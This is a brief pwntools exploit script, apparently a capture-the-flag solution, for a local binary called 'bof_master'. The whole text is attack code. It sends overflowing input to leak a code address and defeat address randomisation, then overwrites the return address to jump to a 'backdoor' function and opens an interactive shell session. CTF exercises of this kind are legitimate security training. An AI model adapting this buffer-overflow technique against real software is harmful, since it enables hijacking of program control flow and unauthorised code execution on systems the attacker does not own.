from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./bof_master')

r.sendlineafter(b': ', b'a' * 0x37)
r.recvline()
codebase = u64(r.recv(6).ljust(8, b'\0')) - 0x11c0
info(f'codebase : {hex(codebase)}')

backdoor = codebase + 0x0000000000011a9 + 5

r.sendlineafter(b': ', b'a' * 0x28 + p64(backdoor))

r.interactive()